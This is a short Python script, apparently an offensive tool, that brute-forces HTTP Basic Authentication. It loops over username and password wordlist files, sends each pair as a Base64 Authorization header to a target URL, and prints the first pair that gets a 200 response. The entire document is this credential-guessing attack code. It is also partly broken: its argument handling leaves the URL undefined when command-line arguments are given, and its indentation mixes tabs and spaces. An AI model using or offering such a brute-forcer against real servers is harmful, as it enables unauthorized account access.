from sys import argv
import requests
import base64

if len(argv) != 3:
	URL = input('Insert URL: ')
	fileUsers = input('Insert UserName File: ')
	filePaswd = input('Insert password File: ')
#print(URL +" "+ fileUsers + " "+filePaswd)
userList = open(fileUsers, "r")
paswdList = open(filePaswd, "r")
users = userList.readlines()
passwords = paswdList.readlines()

for user in users :
	for paswd in passwords :
		user_pass = "%s:%s"%(user.strip('\n'),paswd.strip('\n'))
		#print(user_pass)
		res = user_pass.encode(encoding='UTF-8')
		base64_valueB = base64.b64encode(res)
		base64_value = base64_valueB.decode("utf-8")
		hdr = {'Authorization': "Basic %s"%base64_value}
		req = requests.get(URL, headers = hdr)
		if req.status_code == 200 :
		 	print ("user: " + user + " password: " + paswd)
		 	exit(0)
print("NOT FOUND")
